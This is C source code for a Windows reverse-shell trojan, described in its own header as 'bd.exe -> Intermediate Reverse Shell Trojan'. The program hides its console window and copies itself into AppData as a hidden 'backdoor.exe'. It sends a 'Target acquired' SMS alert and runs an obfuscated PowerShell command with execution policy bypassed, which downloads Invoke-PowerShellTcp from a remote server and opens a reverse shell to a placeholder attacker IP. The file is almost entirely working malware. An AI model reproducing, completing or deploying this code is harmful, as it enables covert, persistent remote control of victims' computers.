/*
 * Application: bd.exe -> Intermediate Reverse Shell Trojan
 * Author:			Malik R. Booker
 * Created:			April 10, 2021
 * Last Updated:	April 10, 2021
 *
 *
 * Description: This is an Intermediate level program that I 
 * created. It DOES move itself into the 
 *
 *
 * DISCLAIMER: I won't take any responsibility for any crimes or 
 * malicious activity used with either fragments or sections of 
 * this source code. Don't be an idiot.
 *
 */

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#define CBUFFSIZE 0x0400
#define SBUFFSIZE 0x2000

int IsInTargetPath(char* path);
int IsConnectedToServer(void);
int IsTempFile(char* path);
int MoveSelf(char* path);
int Reboot(void);

char* GetFileName(char* path);
char* CeasarCypher(char* text);

void BuildGlobalCommand(char* command);
void SendNotification(void);
void HideFile(void);
void HideWindow(void);

int main(int argc, char* argv[])
{
	HideWindow();

	char file_name[MAX_PATH] = { 0 };
	snprintf(file_name, sizeof(file_name), "%s", argv[0]);
	if (!IsInTargetPath(file_name) && !IsTempFile(file_name))
	{
		// Moves the file to appdata as backdoor.exe
		MoveSelf(file_name);
		
		// uncomment to change the file to hidden
		HideFile();

		return Reboot(); // reloads the application and exits current process
	}

	char command[CBUFFSIZE] = { 0 };
	BuildGlobalCommand(command);

	int attempts = 0;
	SendNotification();
	while (attempts < 5) // Adjust as desired.
	{
		if (IsConnectedToServer()) // If listening server is active
		{
			system(command); // attempt to download powershell script
		}

		Sleep(60000);
		++attempts;
	}

	return 0;
}

int IsConnectedToServer(void)
{
	/*
	 *	This would be where you change hname to the host name
	 *	of your port forwarding service to your listening service 
	 *	OR simply your listening service.
	 */

	const char* hname = "example.host.com";

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
        return 0;
    }

    struct hostent *host;
    host = gethostbyname(hname);
    SOCKET Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    SOCKADDR_IN SockAddr;
    SockAddr.sin_port=htons(80);
    SockAddr.sin_family=AF_INET;
    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
    if(connect(Socket,(SOCKADDR*)(&SockAddr),sizeof(SockAddr)) != 0)
	{
        return 0;
    }

    send(Socket,
		"GET / HTTP/1.1\r\nHost: example.website.com\r\nConnection: close\r\n\r\n",
		strlen("GET / HTTP/1.1\r\nHost: example.website.com\r\nConnection: close\r\n\r\n"),
		0);

    int nDataLength;
    char buffer[SBUFFSIZE];
    while ((nDataLength = recv(Socket, buffer, SBUFFSIZE, 0)) > 0)
	{
        int i = 0;
        while (buffer[i] >= 32 || buffer[i] == '\n' || buffer[i] == '\r')
		{
			if (!strncmp(buffer + i, "EXAMPLE_TEST_CASE", strlen("EXAMPLE_TEST_CASE")))
			{
				return 0;
			}
			i++;
        }
    }

    closesocket(Socket);
    WSACleanup();
	return 1;
}

int IsInTargetPath(char* path)
{
	if (*path != 'C')
	{
		return 0;
	}

	size_t size = strlen(path);
	for (size_t i = 0; i < size; i++)
	{
		if (!(strncmp(path+i, "AppData", strlen("AppData"))))
		{
			return 1;
		}
	}

	return 0;
}

int IsTempFile(char* path)
{
	size_t size = strlen(path);
	for (size_t i = 0; i < size; i++)
	{
		if (!(strncmp(path+i, "Microsoft", strlen("Microsoft"))))
		{
			return 1;
		}
	}

	return 0;
}

int MoveSelf(char* path)
{
	char command[CBUFFSIZE] = { 0 };
	snprintf(command, sizeof(command),
			"cmd /min /c \"move %s %%APPDATA%%\\backdoor.exe\"", path);

	return system(command);
}

int Reboot(void)
{
	char command[CBUFFSIZE] = { 0 };
	{
		snprintf(command, sizeof(command),
				"cmd /c %%APPDATA%%\\backdoor.exe");
	}

	return system(command);
}

char* GetFileName(char* path)
{
	char* result = (char*)malloc(strlen(path)+1);
	char buffer[CBUFFSIZE];

	int i = 0;
	int j = strlen(path) - 1;
	while (j > 0)
	{
		if (path[j] == '\\' || path[j] == '/')
		{
			break;
		}
		buffer[i] = path[j];

		i++;
		j--;
	}

	int x = 0;
	int y = strlen(buffer) - 1;
	while (x < y)
	{
		buffer[x] ^= buffer[y];
		buffer[y] ^= buffer[x];
		buffer[x] ^= buffer[y];

		x++;
		y--;
	}
	strcpy(result, buffer);

	return result;
}

char* CeasarCypher(char* text)
{
	char* decrypted_string = (char*)calloc(strlen(text), sizeof(char));

	size_t size = strlen(text);
	for (int i = 0; i < size; i++)
	{
		decrypted_string[i] = text[i] - 1;
	}
	
	return decrypted_string;
}

void BuildGlobalCommand(char command[CBUFFSIZE])
{
	char buffer[CBUFFSIZE] = { 0 };

	const char* ip = "XXX.XXX.XXX.XXX";     // IP & port redacted for obvious reasons... I did
	const char* tcp = "XXX.XXX.XXX.XXX";    // use a DNS though. I also used a TCP forwarding
	const char* port = "8080";				// service in order to globalize my access to the target.

	const char* command_flags = "-NoLogo -ExecutionPolicy Bypass -WindowStyle Hidden ";
	const char* command_1 = "iex (New-Object Net.WebClient).DownloadString('http://";
	const char* command_2 = "/Invoke-PowerShellTcp.ps1');"
							"Invoke-PowerShellTcp -Reverse -IPaddress ";
	const char* command_3 = " -Port ";
	
	snprintf(buffer, sizeof(buffer), "%s %s%s%s%s%s%s%s",
			CeasarCypher((char*)"qpxfstifmm"),	// Simple ceasar cypher
			command_flags,
			command_1, ip,
			command_2, tcp,
			command_3, port);

	for (int i = 0; buffer[i] != '\0'; i++)
	{
		command[i] = buffer[i];
	}

	return;
}

void SendNotification(void)
{
	const char* hname = "api.smsglobal.com";
	const char* user = "USER";         
	const char* pass = "PASSWORD";
	const char* from = "FROM";    
	const char* rece = "TO";   
	const char* text  = "Target%20acquired.";

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
        return;
    }

    struct hostent *host;
    host = gethostbyname(hname);
    SOCKET Socket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    SOCKADDR_IN SockAddr;
    SockAddr.sin_port = htons(80);
    SockAddr.sin_family = AF_INET;
    SockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
    if(connect(Socket, (SOCKADDR*)(&SockAddr), sizeof(SockAddr)) != 0)
	{
        return;
    }

	char request[SBUFFSIZE] = { 0 };
	sprintf(request, "GET /http-api.php?action=sendsms&user=%s"
					"&password=%s&from=%s&to=%s&text=%s\r\n HTTP/1.1\r\n"
					"Host: %s\r\nConnection: Close\r\n\r\n", 
					user,
					pass,
					from,
					rece,
					text,
					hname);

    send(Socket, request, strlen(request), 0);

    closesocket(Socket);
    WSACleanup();

	return;
}

void HideFile(void)
{
	char command[CBUFFSIZE] = "attrib +h %APPDATA%\\backdoor.exe";
	system(command);

	return;
}

void HideWindow(void)
{
	AllocConsole();
	HWND hidden = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hidden, 0);

	return;
}